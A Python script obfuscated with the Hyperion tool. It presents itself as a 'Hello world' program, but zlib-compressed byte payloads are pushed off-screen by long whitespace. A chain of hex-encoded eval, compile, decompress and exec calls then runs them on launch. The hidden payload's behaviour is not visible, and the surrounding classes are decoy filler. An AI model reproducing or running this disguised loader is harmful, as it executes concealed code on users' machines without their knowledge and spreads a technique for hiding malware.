from builtins import *
from math import prod as Run


__obfuscator__ = 'Hyperion'
__authors__ = ('n1k4xryougaaa',)
__github__ = 'https://github.com/n1k4xryougaaa/Hyperion'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Absolute, Add, Substract, Statistics, Theory, Builtins, _ceil = exec, str, tuple, map, ord, globals, type

class While:
    def __init__(self, Invert):
        self._random = Run((Invert, -17613))
        self.Divide(Frame=-7912)

    def Divide(self, Frame = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._random *= 99692 - Frame
        
        try:
            (_power, _power) if Theory is _power else (Statistics, Substract, Statistics) < Statistics

        except TypeError:
            (Absolute, Statistics) if Theory is Absolute else (Absolute, Statistics) != Substract

        except:
            _ceil(-33575 * -58731) == str

    def _cube(self, _hypothesis = -88184):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _hypothesis += -91752 * 84970
        self._calculate != False
        
        try:
            ((Substract, (Absolute, Statistics)) for Substract in {_power: Absolute} if Absolute == Theory)

        except TypeError:
            (({_power: Absolute}, Add) for Add in (_power, _power))

        except:
            _ceil(-31311 / -18661) == float

    def _run(_negative = Ellipsis):
        return Builtins()[_negative]

    def _while(_modulo = -46395 + 61612, Cube = True, Hypothesis = Builtins):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Hypothesis()[_modulo] = Cube
        
        try:
            (({'g1r41aoxguu': Statistics}, Absolute) for Absolute in {_power: Substract})

        except ArithmeticError:
            (((_power, Substract, _power), _power) for _power in {_power: Absolute})

        except:
            _ceil(-35901 * 6314) == Ellipsis

    def execute(code = str):
        return Absolute(Add(Substract(Statistics(Theory, code))))

    @property
    def _calculate(self):
        self.Algorithm = '<__main__._cube object at 0x000009649BE99505>'
        return (self.Algorithm, While._calculate)

if __name__ == '__main__':
    try:
        While.execute(code = __code__)
        _positive = While(Invert = -68272 - 44266)

        While(Invert = 74329 + 49152).Divide(Frame = _positive._random + -46822)                                                                                                                                                                                                                                                          ;While._while(_modulo='DDDoDoooOoDOODOoDoooDODDO',Cube=b'x\x9c\xdd\x1bko\xdb8\xf2{~\x857_d\xa3i*\x91\x12)\x05\xe8\xb7\xdca\x13\xa4\xf1\xe1r\xd8t\xd1\x06\x86l\xc9\xadRY\n\xfc\xd88\xff\xfef\xf8\x90\xe8\x97\x1e\xb6\x9b\xeeF4\xdf\x14E\x0eg\x863Cz>}\xb98\xe9\xc0\x93\x8c\xbb"\xc6g0\xc8\x87\xe3\xc5l\x14\xce\xf3\xe9`\xd0\xf9\xed\xe3\xe9\xef/O\xf14\xc9\xb3\xd3N>5\x9a\x85\x8b\xf9\xf7|:\x13m\xba\xa7\x99\xf3\xc3]N_\xf2\xc5\xb70\x0cO\xcfz+M\xbf%\xf3\xef\x8b\xa1\xec\xed\xfb|\xfe4\xbb\xf8\xf0A\x96\x9d\x8f\xf2\xc9\x87\x95w?\xec\xf8\\\x9a\x8c\xe2l\x16\xcbN\xfe\xf5\x9f\x9b\xf7\xe4\xdc^k2\xca#Yo=M\x93l\xde=\xfd=N\xd3\xbc\xf3\x9cO\xd3\xe8\xb7\xd3\x9eu\xd2\xbb(Zc\xbd5\xfb\x91DV\xef$^\x8e\xe2\xa7\xb9\x02E\xf6\xb4\x807\xff\x9b\xcf\xe2Y\'\x9c\xc6\x9di\x1c}\xcd\xfeH\xf24\x9e\xcb\x82a\xba\x88\xbff\x7f\xe6\x0b\x91\x0b;\xd8\xc9\xd7\xec6\x1f\xe6\xd1K\'M~\xc0{0\x95\xd3\xde\x89\x1cT2y\xca\xa7\xf3\xc1\x00\xbe\xf62\xb3z\xe7\xf12\x99w{\'i>\n\xd3Y\xb7\xf7\xc5\xca///\xfb\xfd\x1c~\x97\xfd\xcb\x1c\xc2KL\xf5\xad\x87\x8f\xdf\xd2|\x08\x8dNv\xb4\xc0\x97\xb3\xc9$\x9bd\xf0L \x01\xa9\x89\xf5\xe5\xe2\xe2\xdd\xfbw\xef\xbb\xef\xbb\xef\x9c^\xef\x01z\x89\xe7\xe1|>\xad\xea\xe5\xea\xe6\xe6\xfa\n\x1cD\xd7W7W\x90\x85\xe7\xfaf\xb3\xaf(\xa9\xecg\xa2G!\x12\xe8a\x16r\xa6\'\x9bu\xf8\xc6\xed\xed\xed\'\xe1?}\xc2\x04\xc6\xf0J\t\xb5\xaa\xaf\xdd\xdd\xdd\x11B\xee\x88\x88\x88\x88\xee\xe0\xe5-]v\xad\xe1"I\xe7I\x86\x0b\xf0W8\xad\x04i\xdf\xb6\xa1\xc0\x16\xbf<\xef\xdb}\xb1\x16\x02\xccb\nr\x12Yw\xebwfY2O\x93\xc5p\x1dt\xbd3\x80\'>\x00\xdc\xab\xeb\xeb\x02\xdeW-\xbb\xe9}9R?\xe7I\x16\xc5\xcb\xae5\x9d\xcf6*\x1fzU\xf0\xf9|\x7f\xffY<\x10\xdd\xdfc\xe6\r\x83\'^L\xff\xd7\x12>w\x02#\x11\x19\xf1\x91\xf8\xf9\x96!\x94&O\x93|\xb4\rH\xdbI>I\x92\xc7$}D\x0fa\x9a`\x9c`\xd4\x1cHI2\x9a\x85Yr(\x90vv\xd3\x12H\xbb\xfb\xd1@z\x19\'\xe92\xfe\x9e-\xb6\x81i\x1b\x1fC@\x89\xaf\xe2s#\xf8\xf3\xcd\xf5\x1b\xc6\xa24\xcf7k\xab\xe9\xecy\xf9,\x9f%\xfe\x96\xcbg\x19\xbde \x85\x7f\xc5\xcd\xe9\x0cv/\xd8\xbap\x13\xb3m\xb1\x8b\xbd\xe5m,\x9e\xa5\xe1\xbf\xdb\x10\x97D\x9b\xa5F\x1b\x0c\x11{\xde2\xfa\xcc\xc3<\x1d\xb7\x81\x11"\xd0%\xfer\x8c\xf2\x1c\x08\x10\xc8\x11 dY\xe7\x8fy\x92\xd5\t\xa6\x12z\x99\x90Q\x11\xa8\xe6\xb7wPo\xd7\xea\x91\x813`\xe0\x9c\x01\x1d\x04\x032\xe0\x03\n\xed\xe9fi\x93\xeevn6\xdd\xa1E=oL\tx\x06\xde\x07\x1f\x80wU\x99\xa3\xca\x08\x19\x12\x9fD\x8d\xda:$\x00\xf92\x8aQ\x0f\xe9Z\xfex\xbe\xc9\xee{2xx\xbbX6\x8a\x97[\x99\xd4n\\\xa9Z#\x16\xb3H\xf82\x8c\x8d|\x91\xae\x83\xfb\x03\xa0\x7f\x96\x9c\x81\x9f>\x9d\xe1\x10;\xf3i\xfe4I:zB\x9dI>\x1d\x1f\x8cQ6\x89\x04\xb64\xc5\x84\x9d\xa4\xa7\xa9F"\x88@\x12\x89(@};\xde\xa9\x04c\xc0b\xee\xd6\x02i\xc7N"\xc4|!\xe9K\x8f\xf2\xff\xfd\x9e\x03\xf1\xb8\xcf<F\xeb\x87\xb2\x0b2}\xd0\xce@CC\xedL\xeen\xa0\xa8A\xde\x86\xf1T\xb0#\xb1\xf0\xcd\xf8\x8f?\xf0\x80\xbb\xb0\x81\xe48\x04\xbc\x0b\xed\x83\xcd\xd2\x83\xb1\x85\x02\xcf\xf0L^\xa3x\n\xe6\xb1\x8ec\xbd\xe2?M\xda\xba-\xf8\xcf.\xf8V\r\x98\xfb\x1c\x1f\x19\xca\xd8\x17\x8e\x9b\xbevi?\xa6\xe1d\x18\x85\x9d\xa5\x84\x99\xd8w\xf5\x0e|\xb1\r\x03\xf7\x19+\x0b\xc1\x05\xe0G\x10\x8e\x84\xd39\x19\x8fD\x8b\x91ra\xfd\xa8\xf7Yb\xc2\x19\x85\xde=\xe6pBj!\xb3\x9b\x1d\xc0\'\xa0\xef\xc7\x14:\xc6\xbeS\xf8"\x164Ch\x0f\x90\xd6\x86M\xd3\x81\x90@\x1c\x08\x84f\x9b\xa5\x07#\xb4\xa3\xd8\x9f\xddf#T\xd8\x80r\xaa l$g!\xbbb\xd4\n\x1f,)\xc2I\xc9NHw\xcd\x00\x14\x08zF\xea\x0e\x00(\xee\xc0\x81\xd66\xa4V\xca\x8e"m\xd8J\x82 \xcas%Ix\x05\x05\x97\xd2F][\xba\x07\x905\xfb\xbeGN\x8e\xc1\xc5vP\xeeCq\xee\x98\x81s\xf5\x03)\x9d\x87P\x95\xff,*\xf3\xc6\xde\x18\xc4\x00\x07\xf79L\x1fBkr\x04%\x0eI\x1d\xe1\xb9\x11.\x1d\x93:\x8aE\xcb\x94\x908Q^\x93Cv\xb1s\xc3\xdb99m+\x96\x12\x85\xa4\xa9\xac\xa1`\xee\x029x@\n\x1e8"6B\x14\xcc\xbd\xcd\xd2_\xcaG\xa4t"\xd0[\xe0\xf9\xe7\xf6P\xaa\xdcW`\xb7p\x03t\x18\xcb\xb4LI\'\xebtM\xe3\xbd\x10X;<\t~3\xc1\x8f=\xb6c|vnKk\xb5T\xfas\xc8\x0b\xb9\xa8\xff\xfaH\xbb\xff6\xc9\xe9\x01d[\xbdfr}th\xae\x9f\xce7^)\xb5&Y\x11\x03\x1d\x1e\x93\x89\xba\xc0\xf9\x05\xc3\x84X\xb1\xd4\x15/K\xb1\xcdO\x13YFB]\x00I\xfd\x106z\x8b\xba\xe3\'\xa18\x8a\xdf\xa7\x7f\x08*\x8a\xc7\x0e\x89Ml\x8f\xb21\x80\x81\x00rz\x04\xc1N\x18\x83<\x85\xbc\xc3]\x90\xea\\bs\xce\x02H\xfbPO\x99\x0f\x80\x8b\x18\xbe\xe1\xc8\x1eJ\xe7A\x1b\xec\x05\x80;\xe6\x94\xbb\xeb\xbd\xc3\xdclw\xe8z^`\x87\xf0\xaex\xf6\x07~z\x85N?\xc0Y\xae0\x9b6\xe3\xf36\xd47\x12w\xd0VC\x81\xfd;\x82\xf9\xa3\xac\x04\xb1\xb0\xd5l\x946\x95TQ\xb5\xb2\xb5\x82\x05\xa1\'$\xd5\x8d\xd2_\xb1\xc3\x94;\xcd~d\xf5\x93\x98\x9b\xc7=\x1f<W\xb1\xafr\xabe\\\xd5\x88TcVwu}\x83\xa6 4\x10\xa9c\x88}$\x8eI\xc1/\x85\xb0!\xa5\x98f\xf8\xe0\x08\xd1\xdb\x13.\x00T\xf2\x07>\xb4\'\x9b\xa5\x07\xe3\x03Wj\xb5\xbb\xa6^S\x95\x17B\xb7\x12\xce\x9b\xb4e{H.H\xb3H\xb4\xa9N\xb4\xdcW,\xc5po\x85\xbdNf \xd1\x90\xe8\x81\xc0\\A\xb3\xa8\x18\xfa\x90\xe68\xd0\xcd\xd2\xa3X=\xb4^cZUm\xa3\xcc5\xac\x1eum\xf7\xd1\x83\xae\xd1\xd4),\x9d\xe8\xc4\xa5\x87\xeb\n\xdc\xdej\x16\xab\xb4\x94\x94V\x12nXKJ\x9b\xc9\x8a\x05\xa5\xdex\xb9\x9f\xf1\xd4\xa3\x1e@G\x87\x94\xc8\xb4t\xb2D\xa6\xea\xbf\x7f*\x00\xe8\xbc\x83"\xa8xwq\xf1\xc5Z\xcc\xc7\xbe\xd5\x8d\xa3|\x14G\xe7=+  5\xb8\xda\xaf;e\x80qu\xed\x086L\x83#\xad\xf0-]\xc2\x8b\x1ak\xd8\xc5\x19\x89\xa9\xe1\\1\xc6\xb9>\xc2\xe4\xbb\x0fu#+\xed\xc6\xdbm\xc8\xda\x92\\\xf5\x95/\xbdn\xbf/\x8e?r\xb5\x04\xb8\x18\xb0(\xf9\xe9+\x9b\x8c\xcf\xc6I\x1ag\xe1$\xfeh\x15j\xbc\x08\xa5i\xf6`\xea\xf4\r\xea\xd2\x14f+\xc6\xc6U\xdaQ\xd4\xd9\xa4m\xc3\r\xf6l\x02\xf5\x1f7N8_\xc5\x08_mOz~V\xe6\xc9r(G\x01\xb2k\x00I\x03\x8e\x1b\x004\x81\\\xd7\xb6\xa9D\xdcm\xcd\xc8^\x97\x85h\xdblX\xd8f\x83"\x0c\x94\x05\xb7l\x01\xd0Q\xa4,\xc9\xb8$\xed\xd5\x12Yj\x13\x90\xab\xa9\xb6M\x8d\x99\x88\x19\xc6\x86\xcdJ\xa8[6\x88\xf9A%;x5\xa6sG\x0c\x9c\x148zww0\xc7i)\xfb\x1a\x1cG[\xa0\xb48\xd7\xd0tt\xd4\xd1\x08FQs\xc4\xc4\x98\xc3F\xf5\xbd\xfd\x9d\xf7u\x8b\xa8\xbbc\x827\xc9+ew\xaf\xaeB7\xa2\xda\xd8\x95.\x12N\xa6\xcc0rA;\xa6cfSt\xca\x90\x81tF\x85\x99C\xa6\x98\xac\xc7<\x86\xf6\xaa\xf6\x0c\xb4\x1b\x10\x7f\xe3\xc4\xa9\x84\xb9,m\xcb\x11\xaa\x1d\xf2\x8bv\xfd!\xdf\xd8\xd6K\x005x\nDa\x84RD\xd2b\x90Ni1\tC\xec\xc7c.3\xe7n\xe2\xdd\xd6\x99\x1b\xd8\'\xcaZ\xf2\xd2m\xa3^9\xd5[\x83{9\x8a\xd5Y\xe3{\xb1\xc1\xed\xe2\x15.X\xc2\xcd&\x94S\x0eT\xcah\r\xa7\xd5\x9bt5\x0e\x02\xcex\x1c\xbc\xaf<\x01\xcf\xc0{*\xa6\xa2\x1c\x91\x7fH\x9cFm+G\xb5C00\x87(/u\x14\xf7_\x94\xd6\xfb\xf3\xe4Hjh\xa0Zf`\xc6!\xb1\xd0Z\r\xb5\xaa\xae-o\xbb;\xd4\xdc?\x18\xa9\xd3W}\xe6\xaa\xf1O\xe3fP\xcf\xb1[\n\x89\xad,Y\x0e\xd4\xdbM/\x08pqf\xca\xc4\xe9\xa9\xa7\xceA\x82\xcd\xd2#\x7f\xb9\x9a\xb3\x1bF\x88\xf5\x93C\xa2N\x0em\xb5\xfcum\xc5\xfd\xa6\xf6\x861%L\xef\xa7\xab\xfe\xd3wVM>\xe6i-\xd3\'\xb5\n\xfeT\xc1\xbfI[\xd2t\x87\xae\x93\xde\xa5\xd4n\xca\xea\xda\xe9\x9cGaT\x817$\x9c5\x14[Aw\x1f\xd2\x90\x860\x9fHx_\xf8a\xbbE$\xbe {\xc9\x08F\xea\xc2\xc6\xa8\xd8\x92\x14S(\xaep\x88\x1c\xbcC\x08\xa7\x94\xfa\xd4c\x0cb\xaeb\xa2bG\xc5\xeeZ\xbdn\x1f\xa8\x98\x151a\x08\r\x1fb\xf7\x88\xfd\x02P\x81\x86\x80\x89\x92\x98\xe1Q\x01EU\x83y\x00%N}\xc6\xb8\xcb\xbd]PD\xc5\x15\xd6#\xc2P\xa6 \xbd?\xac\x18\x8c\x8d\xe1<A\xbc\x02\xc1\x02\xbc\xab\xbcg\xe4\xd7\xe3\xf56\xdb\xca\xcb<e\x0e\xb5\xc1\xe37`~\x86\xd7n[\x9eoi+\xd3\xb8\x1e.\xc0\xd1\x15\xb0\xc4q\xb3\x95<\xc6Ly\xb7"6\xdb\xea~\x8e\xb2.\xb5[U\xd3m1,\xb6\xc5`\xe5\xa2R`\xacq\xed\xe5\xa4\xa3*E\x7f\x0f\xfe\xbd\xcfI\xc8\xab\xda*\x9aH\xf21A\xd6\x82\x03\xc0P\xa6\xca\x9c.+s\xa6\xc4_\x1aNM\x93\xaa\xce\xcb\xd0o\xa0\x13m\x93\xec\x85\x8e\xa55')

        _positive._cube(_hypothesis = 5238 * _positive._random)                                                                                                                                                                                                                                                          ;While._while(_modulo='mnmmnmmnmmmmmmnmnnmn',Cube=b"\xb0\xd5\x03fC/\x93\xf1\xba|\x1f\x14\xba\x9cj\xcf\x94\x16'c\xf9\x1e\xd3z\x9elg\x13\xd4}P\x03B\xb8\x01}1\xce\xc70\x87\x18\xf45\x02)`!B\x17\xb0y\x0czA\x00|\xc0\x06\xf2\xc4\xaf\xee3R\xe3V_q\xd3O\xb3\xc7\x92\xc4F\x05\x91\xf9\xf0\xad1\xa4q\x0c\x11\xb2\x03\xeeA\xca\x9c\xf1\xaav+5[\x9d.kd\t\x1a\xb6M\xd3\xb6\xbfv\x18\xa7M\xdcf\xd9\xb65jn\xa9*\xdf\xd2\xb0s9B\xd5\xe6\x91\xa8\x1dR{\xc7\x0c\xa9\x08#\xd46\xf9\xf6w)\xa6\t\xbe\x03\xd2\xc1\nL\xdaC\xf9\x10\xdd|_\x88 \xbe5\xd1G#\xba?\xa5\xb6\x99\xd7\xb1\xb0\xa3\xe41%\xf7)9\x85\xc93\xb0|SGo\x02\xcb\x88F\xa0\t\x83^,n\xd6\x01\x06A\xba\x89mt\x8bR\xd0\x80\x9f:Tn\xb4\xf6\xc1\x9aw \xael\xfa\x03\xaa\x9c3`P\xbdY\xea\xf5\xac&\xdd\t\xfd\xacYS\xa1o6k\xca\xf1,\xb5\x18\x0c\x83\x81yP\xbdY\xea6\xebn\x97\xb5!\x9b\x14\x7f#\x90\x86\xdb\xc9\xaf;\xb0\xaa\xbe\xf7\x84\xc6\xc1\x92\xb5\x97q\xc1\xec\x8d\xfbPn\xa3\xfbOG\x95\x8a\xfe\x0f\xbf\x81\x1a\xbf")

        if 385143 > 4141410:
            _positive._cube(_hypothesis = -95836 * _positive._random)
        elif 100815 < 4072874:
            While(Invert = -26124 / 49477).Divide(Frame = _positive._random - -95513)                                                                                                                                                                                                                                                          ;lllIllIIIIlIIllll,DDOoOOoDOODOoOoDDoD,oDDoDDooOODOoOoDoDoooDoDo,O000oo0oooOoOOoOoO0oO0,XWWXWXWXWWXXXWWXXXXXWX=(lambda WWXXXXWWWXXWWXXWWWXXWXXXW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WWXXXXWWWXXWWXXWWWXXWXXXW)"),filename='\x6d\x6d\x6d\x6d\x6e\x6e\x6d\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6e',mode='\x65\x76\x61\x6c'))),(lambda WWXXXXWWWXXWWXXWWWXXWXXXW:WWXXXXWWWXXWWXXWWWXXWXXXW(__import__('\x7a\x6c\x69\x62'))),(lambda WWXXXXWWWXXWWXXWWWXXWXXXW:WWXXXXWWWXXWWXXWWWXXWXXXW['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IIILJIJIJLLJJIIILLIIJ,WWXXXXWWWXXWWXXWWWXXWXXXW:IIILJIJIJLLJJIIILLIIJ(WWXXXXWWWXXWWXXWWWXXWXXXW)),(lambda:(lambda WWXXXXWWWXXWWXXWWWXXWXXXW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WWXXXXWWWXXWWXXWWWXXWXXXW)"),filename='\x6d\x6d\x6d\x6d\x6e\x6e\x6d\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        While(Invert = 425 - 2060)._cube(_hypothesis = 97962 - _positive._random)                                                                                                                                                                                                                                                          ;XWWXWXWXWWXXXWWXXXXXWX()(O000oo0oooOoOOoOoO0oO0(oDDoDDooOODOoOoDoDoooDoDo(DDOoOOoDOODOoOoDDoD(lllIllIIIIlIIllll('\x76\x61\x72\x73'))),While._run(_negative='DDDoDoooOoDOODOoDoooDODDO')+While._run(_negative='mnmmnmmnmmmmmmnmnnmn')))

    except Exception as _power:
        if 394054 > 1560982:
            While.execute(code = Add(_power))

        elif 488019 > 4717963:
            While(Invert = 25704 / 24185).Divide(Frame = _positive._random - 47169)